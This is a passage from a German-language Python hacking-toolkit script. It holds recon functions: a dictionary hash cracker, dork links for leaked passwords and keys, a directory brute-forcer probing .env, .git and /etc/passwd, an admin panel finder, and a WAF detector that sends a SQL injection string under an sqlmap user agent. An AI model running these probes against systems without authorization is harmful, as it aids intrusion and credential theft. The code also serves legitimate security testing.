    print(f"  {YG}{len(found)} Subdomain(s) gefunden.{R}")
    wait()

# ── 63  HASH CRACKER ─────────────────────────────────────────
def hash_cracker():
    hdr("HASH CRACKER")
    h = inp("Hash (MD5/SHA1/SHA256)").strip().lower()
    if not h: wait(); return
    div()
    if   len(h) == 32:  algo = "md5"
    elif len(h) == 40:  algo = "sha1"
    elif len(h) == 64:  algo = "sha256"
    else:
        print(f"  {G}[!] Unbekannte Hash-Länge ({len(h)} Zeichen){R}"); wait(); return
    print(f"  {DG}Erkannter Algorithmus: {YG}{algo.upper()}{R}")
    top_pws = [
        "123456","password","12345678","qwerty","123456789","12345","1234567",
        "1234567890","abc123","password1","admin","letmein","welcome","monkey",
        "dragon","master","iloveyou","sunshine","princess","football","shadow",
        "superman","michael","jessica","login","hello","charlie","donald","aa123456",
        "qwerty123","password123","1q2w3e4r","1q2w3e","qwertyuiop","123321","666666",
        "654321","987654321","pass","test","guest","root","administrator","changeme",
        "qazwsx","1qaz2wsx","zxcvbnm","asdfghjkl","1234","0000","9999","1111","2222",
        "3333","4444","5555","6666","7777","8888","1234qwer","qwer1234","pass123",
        "pass1234","password12","P@ssword","P@ss123","P@ssw0rd","Passw0rd","Admin123",
        "batman","spiderman","starwars","matrix","hacker","hackme","exploit",
        "letmein1","letmein123","access","access123","abc","abcd","abcd1234",
        "test123","test1234","testing","tester","demo","demo123","sample",
        "hunter2","trustno1","baseball","hockey","soccer","tennis","golf",
        "liverpool","arsenal","chelsea","barcelona","madrid","thomas","daniel",
        "jessica","matthew","andrew","joshua","michael1","dragon1","master1",
        "summer","winter","spring","autumn","password2","passw","passwd",
        "mustang","ferrari","porsche","bmw","mercedes","audi","toyota",
        "monkey1","soccer1","football1","baseball1","harley","maverick","ranger",
        "hunter","falcon","eagle","phoenix","killer","warrior","champion",
        "123abc","abc321","qweasd","passpass","adminadmin","rootroot","testtest",
        "manager","operator","service","network","firewall","server","router",
        "2023","2024","2025","2022","2021","2020","2019","2018","2000","1999",
        "computer","internet","google","facebook","twitter","amazon","microsoft",
        "windows","linux","ubuntu","apple","iphone","android","p@ssw0rd1","P@ssw0rd1",
        "abc@123","ABC@123","Abc123!","q1w2e3r4","1q2w3e4r5t","Summer2023",
        "Winter2023","Spring2023","Autumn2023","January1","February1","March1",
        "password!","!password","pa$$word","passw0rd","secret","hidden","private",
    ]
    found = False
    total = len(top_pws)
    for i, word in enumerate(top_pws):
        sys.stdout.write(f"\r  {DG}Teste {i+1}/{total} ...{R}  ")
        sys.stdout.flush()
        if hashlib.new(algo, word.encode()).hexdigest() == h:
            print(f"\n\n  {G}[✓] GEFUNDEN: {YG}{word}{R}")
            found = True
            break
    if not found:
        print(f"\n\n  {G}[✗] Nicht in der Wordlist gefunden.{R}")
        print(f"  {DG}Tipp: hashcat oder john mit größerer Wordlist verwenden.{R}")
    wait()

# ── 64  CVE LOOKUP ───────────────────────────────────────────
def cve_lookup():
    hdr("CVE LOOKUP")
    print(f"  {DG}1{R} {G}» CVE-ID suchen (z.B. CVE-2021-44228){R}")
    print(f"  {DG}2{R} {G}» Keyword suchen (z.B. apache log4j){R}")
    mode = inp("Modus (1/2)")
    q    = inp("CVE-ID oder Keyword")
    if not q: wait(); return
    div()
    try:
        if mode == "1":
            url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={q.upper()}"
        else:
            kw  = urllib.parse.quote(q)
            url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={kw}&resultsPerPage=10"
        data = getj(url, timeout=15)
        vulns = data.get("vulnerabilities", [])
        if not vulns:
            print(f"  {G}[!] Keine Ergebnisse.{R}")
        for item in vulns[:10]:
            cve   = item.get("cve", {})
            cid   = cve.get("id", "?")
            descs = cve.get("descriptions", [])
            desc  = next((d["value"] for d in descs if d.get("lang")=="en"), "?")
            score = "?"; severity = "?"
            for key in ("cvssMetricV31","cvssMetricV30","cvssMetricV2"):
                mlist = cve.get("metrics",{}).get(key,[])
                if mlist:
                    m = mlist[0].get("cvssData",{})
                    score    = m.get("baseScore","?")
                    severity = m.get("baseSeverity", str(score))
                    break
            published = cve.get("published","?")[:10]
            print(f"\n  {YG}{'═'*66}{R}")
            row("CVE-ID",     cid)
            row("Published",  published)
            row("CVSS Score", f"{score} ({severity})")
            print(f"  {DG}Description:{R}")
            words = desc.split(); line = "  "
            for w in words:
                if len(line)+len(w)+1 > 72:
                    print(f"  {G}{line.strip()}{R}"); line = "  "+w+" "
                else:
                    line += w+" "
            if line.strip(): print(f"  {G}{line.strip()}{R}")
    except Exception as e:
        print(f"  {G}[!] {e}{R}")
        print(f"  {DG}Tipp: NVD API kann Rate-Limiting haben.{R}")
    wait()

# ── 65  HTTP HEADER ANALYZER ─────────────────────────────────
def http_header_analyzer():
    hdr("HTTP HEADER ANALYZER")
    t = inp("URL oder Domain")
    if not t: wait(); return
    if not t.startswith("http"): t = "https://" + t
    div()
    try:
        req = urllib.request.Request(t, headers={"User-Agent":"Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=10) as r:
            status  = r.status
            headers = dict(r.headers)
        print(f"  {G}Status: {status}{R}\n")
        print(f"  {YG}── Alle Header ──────────────────────────────────────{R}")
        for k, v in sorted(headers.items()):
            print(f"  {DG}{k:<38}{R} {G}{v[:70]}{R}")
        div()
        print(f"  {YG}── Security Header Bewertung ────────────────────────{R}\n")
        sec_hdrs = {
            "Strict-Transport-Security": "HSTS",
            "Content-Security-Policy":   "CSP",
            "X-Frame-Options":           "Clickjack",
            "X-Content-Type-Options":    "MIME-Sniff",
            "Referrer-Policy":           "Referrer",
            "Permissions-Policy":        "Perms",
            "X-XSS-Protection":          "XSS-Prot",
        }
        score = 0
        for hname, label in sec_hdrs.items():
            present = any(k.lower() == hname.lower() for k in headers)
            if present:
                val = next(v for k,v in headers.items() if k.lower()==hname.lower())
                print(f"  {G}[OK]{R}  {DG}{label:<12}{R} {DIM}{val[:50]}{R}")
                score += 1
            else:
                print(f"  {G}[--]{R}  {DG}{label:<12}{R} {G}FEHLT{R}")
        div()
        pct = int(score/len(sec_hdrs)*100)
        rating = "Schlecht" if pct<40 else "Mittel" if pct<70 else "Gut"
        print(f"  {YG}Security Score: {score}/{len(sec_hdrs)} ({pct}%) — {rating}{R}")
    except Exception as e:
        print(f"  {G}[!] {e}{R}")
    wait()

# ── 66  JWT DECODER ──────────────────────────────────────────
def jwt_decoder():
    hdr("JWT DECODER")
    token = inp("JWT Token einfügen")
    if not token: wait(); return
    div()
    parts = token.strip().split(".")
    if len(parts) < 2:
        print(f"  {G}[!] Kein gültiges JWT{R}"); wait(); return
    def _b64d(s):
        s = s.replace("-","+").replace("_","/")
        s += "=" * (-len(s) % 4)
        return base64.b64decode(s).decode("utf-8", errors="replace")
    try:
        hdr_raw  = _b64d(parts[0])
        pay_raw  = _b64d(parts[1])
        hdr_j    = json.loads(hdr_raw)
        pay_j    = json.loads(pay_raw)
        print(f"  {YG}── Header ───────────────────────────────────────────{R}")
        for k,v in hdr_j.items(): row(k, str(v))
        print(f"\n  {YG}── Payload ──────────────────────────────────────────{R}")
        for k,v in pay_j.items():
            if k in ("exp","iat","nbf") and isinstance(v, int):
                try:
                    dt = datetime.fromtimestamp(v).strftime("%Y-%m-%d %H:%M:%S")
                    row(k, f"{v} ({dt})")
                except: row(k, str(v))
            else:
                row(k, str(v)[:80])
        if "exp" in pay_j:
            diff = int(pay_j["exp"] - time.time())
            if diff < 0:
                print(f"\n  {G}[!] TOKEN ABGELAUFEN vor {-diff}s{R}")
            else:
                print(f"\n  {G}[✓] Token gültig noch {diff}s ({diff//3600}h {(diff%3600)//60}m){R}")
        print(f"\n  {YG}── Signatur ─────────────────────────────────────────{R}")
        row("Signatur", "vorhanden" if len(parts)==3 and parts[2] else "FEHLT")
        if hdr_j.get("alg","").lower() == "none":
            print(f"  {G}[!] WARNUNG: Algorithm 'none' — keine Signaturprüfung!{R}")
        print(f"\n  {DIM}Nur Dekodierung — keine Signaturverifizierung.{R}")
    except Exception as e:
        print(f"  {G}[!] {e}{R}")
    wait()

# ── 67  LEAK SEARCH ──────────────────────────────────────────
def leak_search():
    hdr("LEAK SEARCH — DORK LINKS")
    print(f"  {DG}1{R} {G}» E-Mail / Username{R}")
    print(f"  {DG}2{R} {G}» Domain{R}")
    print(f"  {DG}3{R} {G}» Passwort / API-Key{R}")
    mode = inp("Modus (1/2/3)")
    q    = inp("Suchwort")
    if not q: wait(); return
    div()
    enc_q = urllib.parse.quote(q)
    if mode == "1":
        dorks = [
            ("Google Pastebin",   f"https://www.google.com/search?q=site:pastebin.com+{enc_q}"),
            ("Google Gist",       f"https://www.google.com/search?q=site:gist.github.com+{enc_q}"),
            ("Google Ghostbin",   f"https://www.google.com/search?q=site:ghostbin.com+{enc_q}"),
            ("GitHub Search",     f"https://github.com/search?q={enc_q}&type=code"),
            ("Google Telegram",   f"https://www.google.com/search?q=site:t.me+{enc_q}"),
            ("DorkSearch",        f"https://dorksearch.com/?s={enc_q}"),
        ]
    elif mode == "2":
        dorks = [
            ("Google Pastebin",   f"https://www.google.com/search?q=site:pastebin.com+{enc_q}"),
            ("GitHub Code",       f"https://github.com/search?q={enc_q}+password&type=code"),
            ("Google Leaks",      f"https://www.google.com/search?q={enc_q}+password+filetype:txt"),
            ("Google Config",     f"https://www.google.com/search?q={enc_q}+db_password+site:github.com"),
            ("Shodan",            f"https://www.shodan.io/search?query={enc_q}"),
            ("Censys",            f"https://search.censys.io/search?q={enc_q}"),
        ]
    else:
        dorks = [
            ("GitHub Code",       f"https://github.com/search?q={enc_q}&type=code"),
            ("Google Pastebin",   f"https://www.google.com/search?q=site:pastebin.com+{enc_q}"),
            ("Google Gist",       f"https://www.google.com/search?q=site:gist.github.com+{enc_q}"),
            ("Google Config",     f"https://www.google.com/search?q={enc_q}+filetype:env"),
            ("Google JSON",       f"https://www.google.com/search?q={enc_q}+filetype:json"),
            ("Shodan",            f"https://www.shodan.io/search?query={enc_q}"),
        ]
    print(f"  {DG}Generierte Dork-Links für: {YG}{q}{R}\n")
    for label, url in dorks:
        print(f"  {G}{label:<22}{R} {DIM}{url}{R}")
    print(f"\n  {DIM}Links im Browser öffnen — keine automatische Suche.{R}")
    wait()

# ── 68  EMAIL HEADER ANALYZER ────────────────────────────────
def email_header_analyzer():
    hdr("EMAIL HEADER ANALYZER")
    print(f"  {DG}E-Mail-Header einfügen. Leere Zeile = fertig.{R}\n")
    lines = []
    while True:
        try:
            line = input(f"  {G}")
            sys.stdout.write(R)
        except EOFError:
            break
        if not line.strip():
            if lines: break
            continue
        lines.append(line)
    raw = "\n".join(lines)
    if not raw.strip(): wait(); return
    div()
    headers = {}
    cur = None
    for line in raw.splitlines():
        if line and not line[0].isspace() and ":" in line:
            k, _, v = line.partition(":")
            cur = k.strip(); headers[cur] = v.strip()
        elif cur and line.strip():
            headers[cur] = headers.get(cur,"") + " " + line.strip()
    key_hdrs = ["From","To","Subject","Date","Message-ID","Reply-To",
                "Return-Path","Received","X-Originating-IP","X-Mailer",
                "X-Spam-Status","X-Spam-Score","DKIM-Signature",
                "Authentication-Results","Received-SPF"]
    print(f"  {YG}── Wichtige Header ──────────────────────────────────{R}\n")
    for k in key_hdrs:
        if k in headers: row(k[:20], headers[k][:70])
    div()
    print(f"  {YG}── Sicherheitsanalyse ───────────────────────────────{R}\n")
    auth = headers.get("Authentication-Results","").lower()
    spf  = headers.get("Received-SPF","").lower()
    dkim = headers.get("DKIM-Signature","")
    if   "spf=pass"     in auth or "pass"     in spf: print(f"  {G}[OK] SPF: PASS{R}")
    elif "spf=fail"     in auth or "fail"     in spf: print(f"  {G}[!!] SPF: FAIL — mögliche Fälschung!{R}")
    elif "spf=softfail" in auth or "softfail" in spf: print(f"  {G}[??] SPF: SOFTFAIL{R}")
    else:                                               print(f"  {G}[--] SPF: Nicht gefunden{R}")
    if   "dkim=pass" in auth: print(f"  {G}[OK] DKIM: PASS{R}")
    elif "dkim=fail" in auth: print(f"  {G}[!!] DKIM: FAIL{R}")
    elif dkim:                print(f"  {G}[??] DKIM: Signatur vorhanden (nicht verifiziert){R}")
    else:                     print(f"  {G}[--] DKIM: Nicht gefunden{R}")
    if   "dmarc=pass" in auth: print(f"  {G}[OK] DMARC: PASS{R}")
    elif "dmarc=fail" in auth: print(f"  {G}[!!] DMARC: FAIL{R}")
    else:                      print(f"  {G}[--] DMARC: Nicht gefunden{R}")
    div()
    print(f"  {YG}── Phishing-Indikatoren ─────────────────────────────{R}\n")
    alerts = []
    from_h   = headers.get("From","")
    reply_to = headers.get("Reply-To","")
    if reply_to and from_h:
        fd = re.search(r'@([\w.\-]+)', from_h)
        rd = re.search(r'@([\w.\-]+)', reply_to)
        if fd and rd and fd.group(1).lower() != rd.group(1).lower():
            alerts.append(f"Reply-To Domain ({rd.group(1)}) ≠ From ({fd.group(1)})")
    xo = headers.get("X-Originating-IP","")
    if xo: alerts.append(f"Originating IP sichtbar: {xo}")
    ss = headers.get("X-Spam-Score","")
    if ss:
        try:
            if float(ss) > 5: alerts.append(f"Hoher Spam-Score: {ss}")
        except: pass
    if alerts:
        for a in alerts: print(f"  {G}[!] {a}{R}")
    else:
        print(f"  {G}[✓] Keine offensichtlichen Phishing-Indikatoren{R}")
    wait()

# ── 69  TOR / PROXY CHECKER ──────────────────────────────────
def tor_proxy_checker():
    hdr("TOR / PROXY CHECKER")
    ip_in = inp("IP-Adresse prüfen (leer = eigene IP)").strip()
    div()
    if not ip_in:
        try:
            d = getj("http://ip-api.com/json/?fields=query")
            ip_in = d.get("query","")
            print(f"  {DG}Eigene IP: {G}{ip_in}{R}\n")
        except Exception as e:
            print(f"  {G}[!] {e}{R}"); wait(); return
    res = {}
    print(f"  {DG}[1/3] IP-API Analyse ...{R}")
    try:
        d = getj(f"http://ip-api.com/json/{ip_in}?fields=66846719", timeout=8)
        res["Tor (ip-api)"]   = "JA" if d.get("tor")     else "Nein"
        res["VPN (ip-api)"]   = "JA" if d.get("vpn")     else "Nein"
        res["Proxy (ip-api)"] = "JA" if d.get("proxy")   else "Nein"
        res["Hosting/DC"]     = "JA" if d.get("hosting") else "Nein"
        res["ISP"]            = d.get("isp","?")
        res["Land"]           = f"{d.get('country','?')}"
    except Exception as e:
        res["ip-api"] = f"Fehler: {e}"
    print(f"  {DG}[2/3] Tor Exit-Node Liste ...{R}")
    is_tor = False
    try:
        body, _, _ = get("https://www.dan.me.uk/torlist/", timeout=10)
        is_tor = ip_in in body.splitlines()
        res["Tor Exit-Node"] = "JA" if is_tor else "Nein"
    except:
        try:
            rev = ".".join(reversed(ip_in.split(".")))
            try:
                socket.gethostbyname(f"{rev}.dnsel.torproject.org")
                res["Tor Exit-Node"] = "JA (DNS)"
                is_tor = True
            except:
                res["Tor Exit-Node"] = "Nein (DNS)"
        except Exception as e:
            res["Tor Exit-Node"] = f"Fehler: {e}"
    print(f"  {DG}[3/3] Anonymity Score ...{R}")
    div()
    for k,v in res.items(): row(k[:22], v)
    div()
    score = 0
    if "JA" in res.get("Tor (ip-api)",""):   score += 40
    if "JA" in res.get("Tor Exit-Node",""):  score += 30
    if "JA" in res.get("VPN (ip-api)",""):   score += 20
    if "JA" in res.get("Proxy (ip-api)",""): score += 10
    if res.get("Hosting/DC","") == "JA":      score += 5
    score = min(score, 100)
    level = "Niedrig" if score<20 else "Mittel" if score<50 else "Hoch"
    print(f"  {YG}Anonymity Score: {score}/100 — {level}{R}")
    wait()


# ── 70  DIRECTORY BRUTE-FORCE ────────────────────────────────
def dir_bruteforce():
    hdr("DIRECTORY BRUTE-FORCE")
    t = inp("URL / Domain (z.B. https://example.com)")
    if not t: wait(); return
    if not t.startswith("http"): t = "https://" + t
    t = t.rstrip("/")
    wordlist = [
        "admin","administrator","login","wp-admin","wp-login.php","dashboard",
        "panel","controlpanel","phpmyadmin","pma","mysql","db","database",
        "config","configuration","setup","install","backup","bak",
        ".env",".git",".htaccess","web.config","config.php","settings.php",
        "api","api/v1","api/v2","api/v3","rest","graphql","swagger","swagger-ui",
        "docs","documentation","readme","README","changelog","CHANGELOG",
        "test","tests","dev","staging","debug","trace","info",
        "upload","uploads","files","file","static","assets","media","images",
        "img","css","js","scripts","lib","vendor","node_modules",
        "user","users","account","accounts","profile","register","signup",
        "password","forgot","reset","logout","auth","oauth","sso",
        "robots.txt","sitemap.xml","sitemap","humans.txt",".well-known",
        "cgi-bin","server-status","server-info",".DS_Store",
        "shell","cmd","exec","system","console","terminal",
        "phpinfo.php","info.php","test.php","php.php","xmlrpc.php",
        "wp-content","wp-includes","wp-config.php","wp-config.php.bak",
        "etc/passwd","proc/self/environ","windows/win.ini",
        "old","archive","private","secret","hidden","internal","intranet",
        "metrics","health","healthz","ping","status","version","about",
        "staff","team","members","employees","users.txt","passwords.txt",
    ]
    div()
    print(f"  {DG}Teste {len(wordlist)} Pfade auf {t} ...{R}\n")
    found = []
    lock = threading.Lock()
    sem  = threading.Semaphore(20)
    def _probe(path):
        with sem:
            url = f"{t}/{path}"
            try:
                req = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=5) as r:
                    if r.status < 400:
                        with lock:
                            found.append((r.status, url))
                            print(f"  {G}[{r.status}] {url}{R}")
            except urllib.error.HTTPError as e:
                if e.code not in (404, 410, 403):
                    with lock:
                        found.append((e.code, url))
                        print(f"  {YG}[{e.code}] {url}{R}")
            except: pass
    thds = [threading.Thread(target=_probe, args=(p,), daemon=True) for p in wordlist]
    for t2 in thds: t2.start()
    for t2 in thds: t2.join()
    div()
    print(f"  {YG}{len(found)} Pfad(e) gefunden.{R}")
    wait()

# ── 71  WEB CRAWLER ──────────────────────────────────────────
def web_crawler():
    hdr("WEB CRAWLER / LINK EXTRACTOR")
    t = inp("URL (z.B. https://example.com)")
    if not t: wait(); return
    if not t.startswith("http"): t = "https://" + t
    try:
        depth = int(inp("Max. Tiefe (1-3, Standard: 1)") or "1")
        depth = max(1, min(depth, 3))
    except: depth = 1
    div()
    from urllib.parse import urljoin, urlparse
    base_domain = urlparse(t).netloc
    visited = set()
    all_links = set()
    emails = set()

    def _crawl(url, d):
        if d > depth or url in visited: return
        visited.add(url)
        try:
            body, status, hdrs = get(url, timeout=8)
            print(f"  {G}[{status}] {url[:70]}{R}")
            # Extract links
            for href in re.findall(r'href=["\']([^"\']+)["\']', body):
                full = urljoin(url, href)
                if urlparse(full).netloc == base_domain:
                    all_links.add(full)
                elif full.startswith("http"):
                    all_links.add(full)
            # Extract emails
            for em in re.findall(r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}', body):
                emails.add(em)
            # Recurse same-domain only
            same = [l for l in all_links if urlparse(l).netloc == base_domain and l not in visited]
            for link in same[:20]:
                _crawl(link, d+1)
        except Exception as e:
            print(f"  {DG}[!] {url[:50]} — {e}{R}")

    _crawl(t, 1)
    div()
    print(f"  {YG}{len(all_links)} Links gefunden:{R}\n")
    for lnk in sorted(all_links)[:50]:
        col = G if urlparse(lnk).netloc == base_domain else DG
        print(f"  {col}{lnk[:80]}{R}")
    if len(all_links) > 50:
        print(f"  {DIM}... und {len(all_links)-50} weitere{R}")
    if emails:
        div()
        print(f"  {YG}E-Mail-Adressen gefunden:{R}")
        for em in sorted(emails): print(f"  {G}{em}{R}")
    wait()

# ── 72  WAF DETECTOR ─────────────────────────────────────────
def waf_detector():
    hdr("WAF DETECTOR")
    t = inp("URL / Domain")
    if not t: wait(); return
    if not t.startswith("http"): t = "https://" + t
    div()
    waf_signatures = {
        "Cloudflare":       ["cf-ray","__cfduid","cloudflare","cf-cache-status"],
        "AWS WAF":          ["awselb","x-amzn-requestid","x-amz-cf-id","x-amz-id"],
        "Akamai":           ["akamai","x-check-cacheable","x-akamai-transformed"],
        "Imperva/Incapsula":["x-iinfo","x-cdn","incap_ses","visid_incap"],
        "F5 BIG-IP ASM":    ["x-wa-info","bigipserver","ts%3d","tsessionid"],
        "Sucuri":           ["x-sucuri-id","x-sucuri-cache","sucuri"],
        "Barracuda":        ["barra_counter_session","barracuda"],
        "ModSecurity":      ["mod_security","modsecurity","mod_sec"],
        "Wordfence":        ["wfwaf-authcookie","wordfence"],
        "DDoS-Guard":       ["ddos-guard","__ddg1","__ddg2"],
        "Nginx WAF":        ["nginx","x-nginx"],
        "Fortinet":         ["fortigate","fortiwebid"],
        "Wallarm":          ["x-wallarm-node"],
    }
    try:
        req = urllib.request.Request(t, headers={"User-Agent":"Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=10) as r:
            headers_str = " ".join(f"{k.lower()}:{v.lower()}" for k,v in r.headers.items())
            status = r.status
        # Also try a "malicious" request to trigger WAF
        try:
            bad_req = urllib.request.Request(
                t + "/?id=1%27%20OR%201%3D1--",
                headers={"User-Agent":"sqlmap/1.0"})
            with urllib.request.urlopen(bad_req, timeout=8) as r2:
                headers_str += " " + " ".join(f"{k.lower()}:{v.lower()}" for k,v in r2.headers.items())
                bad_status = r2.status
        except urllib.error.HTTPError as e:
            bad_status = e.code
            headers_str += " " + str(e.headers).lower()
        except: bad_status = 0

        print(f"  {G}Normal request: HTTP {status}{R}")
        if bad_status: print(f"  {G}SQLi request:   HTTP {bad_status}{R}")

        div()
        detected = []
        for waf, sigs in waf_signatures.items():
            if any(sig in headers_str for sig in sigs):
                detected.append(waf)
                print(f"  {G}[+] {waf} erkannt{R}")

        if bad_status in (403, 406, 429, 503) and not detected:
            print(f"  {YG}[?] Unbekannte WAF/Rate-Limiting (HTTP {bad_status} bei bösartigem Request){R}")
            detected.append("Unknown WAF")

        div()
        if detected:
            print(f"  {YG}WAF erkannt: {', '.join(detected)}{R}")
        else:
            print(f"  {G}[✓] Keine bekannte WAF erkannt.{R}")
    except Exception as e:
        print(f"  {G}[!] {e}{R}")
    wait()

# ── 73  ADMIN PANEL FINDER ───────────────────────────────────
def admin_finder():
    hdr("ADMIN PANEL FINDER")
    t = inp("URL / Domain")
    if not t: wait(); return
    if not t.startswith("http"): t = "https://" + t
    t = t.rstrip("/")
    paths = [
        "admin","admin/login","admin/index","admin/dashboard","administrator",
        "administrator/index","admin.php","admin.html","admin/login.php",
        "wp-admin","wp-admin/","wp-login.php","wp-admin/admin.php",
        "phpmyadmin","phpmyadmin/","pma","mysql/","myadmin/",
        "cpanel","cpanel/","whm","webmail","roundcube","plesk",
        "panel","controlpanel","control","manage","management","manager",
        "backend","backoffice","cms","dashboard","console","portal",
        "adminpanel","adminarea","admincp","moderator","superadmin",
        "user/login","account/login","accounts/login","auth/login",
        "login","signin","sign-in","logon","secure/login",
        "joomla/administrator","administrator/index.php",
        "drupal/admin","django/admin","rails/admin","adminlte",
        "admin1","admin2","admin_area","admin_page","admin_login",
        "site_admin","siteadmin","site/admin","webadmin","web_admin",
        "staff","staff/login","employee","employees","members/login",
        "config/admin","system/admin","server/admin","host/admin",
        "index.php/admin","admin/index.php","login/admin",
        "secure","private","secret","hidden","internal",
        "api/admin","rest/admin","v1/admin",
    ]
    div()
    print(f"  {DG}Suche Admin-Panel auf {t} ...{R}\n")
    found = []
    lock = threading.Lock()
    sem  = threading.Semaphore(20)
    def _chk(path):
        with sem:
            url = f"{t}/{path}"
            try:
                req = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=5) as r:
                    if r.status < 400:
                        with lock:
                            found.append((r.status, url))
                            print(f"  {G}[{r.status}] {url}{R}")
            except urllib.error.HTTPError as e:
                if e.code == 403:
                    with lock:
                        found.append((403, url))
                        print(f"  {YG}[403 FORBIDDEN — existiert!] {url}{R}")
            except: pass
    thds = [threading.Thread(target=_chk, args=(p,), daemon=True) for p in paths]
    for t2 in thds: t2.start()
    for t2 in thds: t2.join()
    div()
    if found:
        print(f"  {YG}{len(found)} Admin-Panel(s) gefunden!{R}")
    else:
        print(f"  {G}Kein Admin-Panel gefunden.{R}")
    wait()

# ── 74  CRT.SH SUBDOMAIN LOOKUP ──────────────────────────────
def crtsh_lookup():
    hdr("CRT.SH SUBDOMAIN LOOKUP")
    t    = inp("Domain (z.B. example.com)")
    host = re.sub(r"https?://","",t).split("/")[0].strip()
    if not host: wait(); return
    div()
    print(f"  {DG}Suche in Certificate Transparency Logs für {host} ...{R}\n")
    try:
        enc  = urllib.parse.quote(host)
        data = getj(f"https://crt.sh/?q=%.{enc}&output=json", timeout=15)
        subs = set()
        for entry in data:
            name = entry.get("name_value","")
            for n in name.split("\n"):
                n = n.strip().lstrip("*.")
                if n.endswith(host) and n != host:
                    subs.add(n)
        if not subs:
            print(f"  {G}Keine Subdomains in CT-Logs gefunden.{R}")
        else:
            print(f"  {YG}{len(subs)} Subdomain(s) in CT-Logs:{R}\n")
            for sub in sorted(subs):
                try:
                    ip2 = socket.gethostbyname(sub)
                    print(f"  {G}[+] {sub:<50} → {ip2}{R}")
                except:
                    print(f"  {DG}[-] {sub}{R}")
    except Exception as e:
        print(f"  {G}[!] {e}{R}")
    wait()

# ── 75  ROBOTS.TXT INSPECTOR ─────────────────────────────────
def robots_inspector():
    hdr("ROBOTS.TXT & SITEMAP INSPECTOR")
    t = inp("Domain / URL")
    if not t: wait(); return
    if not t.startswith("http"): t = "https://" + t
    host = t.rstrip("/")
    div()
    # robots.txt
    print(f"  {YG}── robots.txt ────────────────────────────────────────{R}\n")
    hidden_paths = []
    try:
        body, _, _ = get(f"{host}/robots.txt", timeout=8)
        for line in body.splitlines()[:60]:
            line = line.strip()
            if not line or line.startswith("#"): continue
            print(f"  {G}{line}{R}")
            if line.lower().startswith("disallow:"):
                path = line.split(":",1)[1].strip()
                if path and path != "/":
                    hidden_paths.append(path)
    except Exception as e:
        print(f"  {DG}[!] robots.txt nicht gefunden: {e}{R}")

    if hidden_paths:
        div()
        print(f"  {YG}Versteckte/gesperrte Pfade ({len(hidden_paths)}){R}\n")
        for p in hidden_paths[:20]:
            print(f"  {G}  {host}{p}{R}")

    # sitemap.xml
    div()
    print(f"  {YG}── sitemap.xml ───────────────────────────────────────{R}\n")
    try:
        body2, _, _ = get(f"{host}/sitemap.xml", timeout=8)
        urls = re.findall(r"<loc>([^<]+)</loc>", body2)
        print(f"  {G}{len(urls)} URL(s) in Sitemap.{R}\n")
        for u in urls[:20]:
            print(f"  {DG}{u[:78]}{R}")
        if len(urls) > 20:
            print(f"  {DIM}... und {len(urls)-20} weitere{R}")
    except Exception as e:
        print(f"  {DG}[!] sitemap.xml nicht gefunden: {e}{R}")
    wait()

# ── 76  TECH FINGERPRINTING ──────────────────────────────────
def tech_fingerprint():
    hdr("TECH FINGERPRINTING")
    t = inp("URL / Domain")
    if not t: wait(); return
    if not t.startswith("http"): t = "https://" + t
    div()
    try:
        body, status, hdrs = get(t, timeout=10)
        body_l = body.lower()
        hdrs_l = {k.lower(): v.lower() for k, v in hdrs.items()}
        row("Status", str(status))
        row("Server", hdrs.get("Server","?"))
        row("Powered-By", hdrs.get("X-Powered-By","?"))

        techs = []
        # CMS
        if "wp-content"      in body_l: techs.append("WordPress")
        if "drupal"          in body_l: techs.append("Drupal")
        if "joomla"          in body_l: techs.append("Joomla")
        if "magento"         in body_l: techs.append("Magento")
        if "shopify"         in body_l or "cdn.shopify" in body_l: techs.append("Shopify")
        if "wix.com"         in body_l: techs.append("Wix")
        if "squarespace"     in body_l: techs.append("Squarespace")
        if "ghost.io"        in body_l or "ghost-theme" in body_l: techs.append("Ghost")
        if "typo3"           in body_l: techs.append("TYPO3")
        if "laravel"         in body_l or "laravel_session" in str(hdrs_l): techs.append("Laravel")
        if "symfony"         in body_l: techs.append("Symfony")
        if "django"          in body_l: techs.append("Django")
        if "rails"           in body_l: techs.append("Ruby on Rails")
        if "next.js"         in body_l or "__next" in body_l: techs.append("Next.js")
        if "nuxt"            in body_l: techs.append("Nuxt.js")
        if "react"           in body_l or "react-dom" in body_l: techs.append("React")
        if "angular"         in body_l: techs.append("Angular")
        if "vue.js"          in body_l or "vue-router" in body_l: techs.append("Vue.js")
        if "jquery"          in body_l: techs.append("jQuery")
        if "bootstrap"       in body_l: techs.append("Bootstrap")
        # Server
        sv = hdrs.get("Server","").lower()
        if "nginx"   in sv: techs.append("Nginx")
        if "apache"  in sv: techs.append("Apache")
        if "iis"     in sv: techs.append("Microsoft IIS")
        if "litespeed" in sv: techs.append("LiteSpeed")
        if "cloudflare" in sv: techs.append("Cloudflare")
        # Language
        xpb = hdrs.get("X-Powered-By","").lower()
        if "php"     in xpb: techs.append(f"PHP ({hdrs.get('X-Powered-By','')})")
        if "asp.net" in xpb: techs.append("ASP.NET")
        # CDN / Hosting
        if "cloudflare" in str(hdrs_l): techs.append("Cloudflare CDN")
        if "x-amz" in str(hdrs_l): techs.append("Amazon AWS")
        if "x-azure" in str(hdrs_l): techs.append("Microsoft Azure")
        if "x-goog" in str(hdrs_l): techs.append("Google Cloud")
        # Analytics
        if "google-analytics" in body_l or "gtag" in body_l: techs.append("Google Analytics")
        if "googletagmanager"  in body_l: techs.append("Google Tag Manager")
        if "facebook.net"      in body_l: techs.append("Facebook Pixel")
        # SSL
        if t.startswith("https"): techs.append("HTTPS/TLS")
        div()
        if techs:
            print(f"  {YG}Erkannte Technologien:{R}\n")
            for tech in dict.fromkeys(techs):  # dedupe preserving order
                print(f"  {G}  [+] {tech}{R}")
        else:
            print(f"  {G}Keine bekannten Technologien erkannt.{R}")
    except Exception as e:
        print(f"  {G}[!] {e}{R}")
    wait()

# ── 77  REVERSE IP LOOKUP ────────────────────────────────────
def reverse_ip_lookup():
    hdr("REVERSE IP LOOKUP")
    t    = inp("Domain oder IP")
    host = re.sub(r"https?://","",t).split("/")[0].strip()
    if not host: wait(); return
    div()
    try:
